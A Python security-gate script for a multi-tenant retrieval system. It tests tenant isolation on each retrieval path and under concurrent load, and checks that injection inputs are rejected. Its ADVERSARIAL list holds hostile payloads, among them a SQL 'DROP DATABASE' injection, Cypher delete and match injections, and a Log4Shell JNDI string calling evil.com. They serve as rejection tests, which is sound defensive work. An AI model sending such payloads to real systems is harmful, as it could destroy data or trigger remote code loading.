"""Security gate: isolation must hold on every retrieval path, under load.

The edge case suite probes isolation through the full pipeline, which routes and
so may not exercise every path for a given query. This checks each path directly
— vector, BM25, graph, hybrid, community — because a leak in one would be masked
by the router simply not choosing it.

Also runs the probes concurrently and interleaved across tenants: `contextvars`
are per-task, so isolation should hold by construction, but "should" and "does"
are different claims and only one of them is evidence.

A single leak fails the gate regardless of retrieval quality.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Sequence, Tuple

from app.core.exceptions import SecurityViolationError
from app.core.tenant_context import TenantContext, tenant_scope
from app.services.arcadedb_client import arcadedb_client
from app.services.embedding_service import embedding_service
from app.services.graph_expansion import community_search
from app.services.lexical_search import lexical_search_service
from app.services.query_understanding import query_understanding
from app.services.retrieval_pipeline import retrieval_pipeline
from app.services.vector_index import vector_index_service

# Terms verified by direct query to exist in exactly one tenant.
#
# Choosing these correctly is the whole test. "Brahmi" looks like a docs-only
# term but appears in 70 chunks of the Ayurveda CSV's herb columns, so probing
# for it produces hits that are indistinguishable from a leak — the entity is
# genuinely present in both, ingested independently. A probe on a shared term
# proves nothing and produces false alarms.
#
# Each term below was confirmed absent from the tenant being probed before being
# added, and `verify_probe_terms` re-checks that at run time so the suite fails
# loudly if a later ingest introduces the term rather than reporting a leak.
PROBES: List[Tuple[str, str, List[str]]] = [
    # (owning tenant, tenant to probe, terms unique to the owner)
    ("herbs_docs", "ayurveda_full",
     ["Bacopa monnieri", "Withania somnifera", "Curcumin"]),
    ("ayurveda_full", "herbs_docs",
     ["Alkaptonuria", "Argininosuccinic Aciduria", "Paschimottanasana",
      "Adrenal Insufficiency"]),
]

ADVERSARIAL = [
    "Cough'; DROP DATABASE tenant_ayurveda_full_kb; --",
    "Cough DETACH DELETE n",
    "Cough UNION ALL MATCH (n) RETURN n",
    "Cough CALL dbms.components()",
    "Cough ${jndi:ldap://evil.com/a}",
    "Cough /* comment */ RETURN 1",
]


@dataclass
class GateCheck:
    name: str
    path: str
    passed: bool
    detail: str
    leaked_terms: List[str] = field(default_factory=list)


class SecurityGate:
    """Runs isolation probes against each retrieval path independently."""

    def __init__(self) -> None:
        self.checks: List[GateCheck] = []

    def _record(self, check: GateCheck) -> None:
        self.checks.append(check)

    @staticmethod
    def _ctx(tenant_id: str) -> TenantContext:
        return TenantContext(
            tenant_id=tenant_id, api_key_id="security_gate", request_id="security_gate"
        )

    @staticmethod
    def _leaked(text: str, terms: Sequence[str]) -> List[str]:
        lowered = text.lower()
        # Match on the first word: "Bacopa monnieri" leaking as "Bacopa" is still
        # a leak, and requiring the full phrase would miss it.
        return [t for t in terms if t.split()[0].lower() in lowered]

    # ------------------------------------------------------------------ paths
    async def check_vector_path(self) -> None:
        for owner, target, terms in PROBES:
            for term in terms:
                ctx = self._ctx(target)
                with tenant_scope(ctx):
                    vector = await embedding_service.encode_query_async(term)
                    hits = await vector_index_service.search(vector, target, top_k=10)
                joined = " ".join(h.text for h in hits)
                leaked = self._leaked(joined, [term])
                self._record(
                    GateCheck(
                        name=f"vector:{target}<-{term[:24]}",
                        path="vector",
                        passed=not leaked,
                        detail=f"{len(hits)} hits from '{target}' probing for "
                               f"'{term}' (owned by '{owner}')",
                        leaked_terms=leaked,
                    )
                )

    async def check_lexical_path(self) -> None:
        for owner, target, terms in PROBES:
            for term in terms:
                ctx = self._ctx(target)
                with tenant_scope(ctx):
                    hits = await lexical_search_service.search(term, target, top_k=10)
                joined = " ".join(h.text for h in hits)
                leaked = self._leaked(joined, [term])
                self._record(
                    GateCheck(
                        name=f"bm25:{target}<-{term[:24]}",
                        path="lexical",
                        passed=not leaked,
                        detail=f"{len(hits)} BM25 hits from '{target}'",
                        leaked_terms=leaked,
                    )
                )

    async def check_graph_path(self) -> None:
        for owner, target, terms in PROBES:
            for term in terms:
                ctx = self._ctx(target)
                with tenant_scope(ctx):
                    vector = await embedding_service.encode_query_async(term)
                    analysis = query_understanding.analyze(term)
                    linked = await retrieval_pipeline._link_entities(  # noqa: SLF001
                        analysis, target, vector
                    )
                names = " ".join(e.name for e in linked)
                leaked = self._leaked(names, [term])
                self._record(
                    GateCheck(
                        name=f"graph:{target}<-{term[:24]}",
                        path="graph",
                        passed=not leaked,
                        detail=f"{len(linked)} entities linked in '{target}'",
                        leaked_terms=leaked,
                    )
                )

    async def check_community_path(self) -> None:
        for owner, target, terms in PROBES:
            for term in terms[:2]:
                ctx = self._ctx(target)
                with tenant_scope(ctx):
                    vector = await embedding_service.encode_query_async(term)
                    hits = await community_search.search(vector, target, top_k=5)
                joined = " ".join(h.text for h in hits)
                leaked = self._leaked(joined, [term])
                self._record(
                    GateCheck(
                        name=f"community:{target}<-{term[:20]}",
                        path="community",
                        passed=not leaked,
                        detail=f"{len(hits)} community reports from '{target}'",
                        leaked_terms=leaked,
                    )
                )

    async def check_hybrid_path(self) -> None:
        """The full pipeline, which is what a caller actually reaches."""
        for owner, target, terms in PROBES:
            for term in terms:
                ctx = self._ctx(target)
                with tenant_scope(ctx):
                    result = await retrieval_pipeline.retrieve(
                        ctx=ctx, query=term, top_k=10
                    )
                joined = " ".join(result["passages"])
                joined += " ".join(n.name for n in result["subgraph"].nodes)
                leaked = self._leaked(joined, [term])
                self._record(
                    GateCheck(
                        name=f"hybrid:{target}<-{term[:24]}",
                        path="hybrid",
                        passed=not leaked,
                        detail=f"{len(result['passages'])} passages, "
                               f"{len(result['subgraph'].nodes)} nodes from '{target}'",
                        leaked_terms=leaked,
                    )
                )

    # ------------------------------------------------------------ concurrency
    async def check_concurrent_isolation(self, rounds: int = 12) -> None:
        """Interleave probes across tenants concurrently.

        contextvars are per-task, so this should hold by construction. Testing it
        turns 'should' into 'does'.
        """
        async def probe(owner: str, target: str, term: str) -> List[str]:
            ctx = self._ctx(target)
            with tenant_scope(ctx):
                result = await retrieval_pipeline.retrieve(
                    ctx=ctx, query=term, top_k=5
                )
            joined = " ".join(result["passages"])
            return self._leaked(joined, [term])

        tasks = []
        for _ in range(rounds):
            for owner, target, terms in PROBES:
                for term in terms[:2]:
                    tasks.append(probe(owner, target, term))

        outcomes = await asyncio.gather(*tasks, return_exceptions=True)
        leaks = [o for o in outcomes if isinstance(o, list) and o]
        errors = [o for o in outcomes if isinstance(o, Exception)]

        self._record(
            GateCheck(
                name="concurrent_interleaved_isolation",
                path="hybrid",
                passed=not leaks,
                detail=f"{len(tasks)} interleaved cross-tenant requests, "
                       f"{len(leaks)} leaks, {len(errors)} errors",
                leaked_terms=[t for leak in leaks for t in leak],
            )
        )

    # ------------------------------------------------------------ adversarial
    async def check_injection(self) -> None:
        for payload in ADVERSARIAL:
            ctx = self._ctx("ayurveda_full")
            rejected = False
            detail = ""
            try:
                with tenant_scope(ctx):
                    await retrieval_pipeline.retrieve(ctx=ctx, query=payload, top_k=5)
                detail = "payload was ACCEPTED and executed"
            except SecurityViolationError as exc:
                rejected = True
                detail = f"rejected: {exc.detail[:60]}"
            except Exception as exc:  # noqa: BLE001
                rejected = True
                detail = f"rejected via {type(exc).__name__}"

            self._record(
                GateCheck(
                    name=f"injection:{payload[:34]}",
                    path="guard",
                    passed=rejected,
                    detail=detail,
                )
            )

    # ------------------------------------------------------------ preflight
    async def verify_probe_terms(self) -> List[str]:
        """Confirm each probe term is genuinely absent from the tenant it probes.

        A probe on a term that both tenants legitimately contain reports a leak
        that is not one. Checking the database directly distinguishes "this
        tenant has its own copy" from "this tenant read another's data", which no
        amount of retrieval-level inspection can.
        """
        problems: List[str] = []
        for owner, target, terms in PROBES:
            for term in terms:
                first_word = term.split()[0]
                with tenant_scope(self._ctx(target)):
                    rows = await arcadedb_client.execute_sql(
                        "SELECT count(*) AS n FROM Chunk WHERE text LIKE :pattern",
                        {"pattern": f"%{first_word}%"},
                        tenant_id=target,
                    )
                count = int(rows[0].get("n", 0)) if rows else 0
                if count:
                    problems.append(
                        f"'{term}' appears in {count} chunk(s) of '{target}' "
                        f"independently; it cannot distinguish a leak."
                    )
        return problems

    # ------------------------------------------------------------------ run
    async def run(self) -> Dict[str, Any]:
        await self.check_vector_path()
        await self.check_lexical_path()
        await self.check_graph_path()
        await self.check_community_path()
        await self.check_hybrid_path()
        await self.check_concurrent_isolation()
        await self.check_injection()

        by_path: Dict[str, Dict[str, int]] = {}
        for check in self.checks:
            bucket = by_path.setdefault(check.path, {"passed": 0, "failed": 0})
            bucket["passed" if check.passed else "failed"] += 1

        failures = [c for c in self.checks if not c.passed]
        return {
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "total_checks": len(self.checks),
            "passed": len(self.checks) - len(failures),
            "failed": len(failures),
            "verdict": "PASS" if not failures else "FAIL",
            "by_path": by_path,
            "failures": [asdict(c) for c in failures],
            "checks": [asdict(c) for c in self.checks],
        }


async def main() -> int:
    parser = argparse.ArgumentParser(description="Security gate")
    parser.add_argument("--out", default="reports")
    args = parser.parse_args()

    await arcadedb_client.start()
    if not await arcadedb_client.is_ready():
        print("ArcadeDB is not reachable.")
        await arcadedb_client.close()
        return 2

    print("=" * 74)
    print("SECURITY GATE — isolation across every retrieval path")
    print("=" * 74)

    gate = SecurityGate()

    # A probe term that both tenants legitimately contain would report a leak
    # that is not one. Catch that here rather than in the results.
    problems = await gate.verify_probe_terms()
    if problems:
        print("\n  INVALID PROBE TERMS — these cannot distinguish a leak:")
        for problem in problems:
            print(f"    {problem}")
        print("\n  Fix the probe set before trusting this gate.")
        await arcadedb_client.close()
        return 2
    print("  probe terms verified absent from the tenants they probe\n")

    summary = await gate.run()

    for path, counts in sorted(summary["by_path"].items()):
        print(f"  {path:<12} {counts['passed']:>3} passed  {counts['failed']:>3} failed")

    if summary["failures"]:
        print("\n  FAILURES:")
        for failure in summary["failures"]:
            print(f"    {failure['name']}: {failure['detail']}")
            if failure["leaked_terms"]:
                print(f"      leaked: {failure['leaked_terms']}")

    print("=" * 74)
    print(
        f"VERDICT: {summary['verdict']} "
        f"({summary['passed']}/{summary['total_checks']} checks)"
    )
    print("=" * 74)

    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "SECURITY_GATE.json").write_text(
        json.dumps(summary, indent=2), encoding="utf-8"
    )

    await arcadedb_client.close()
    return 0 if summary["verdict"] == "PASS" else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
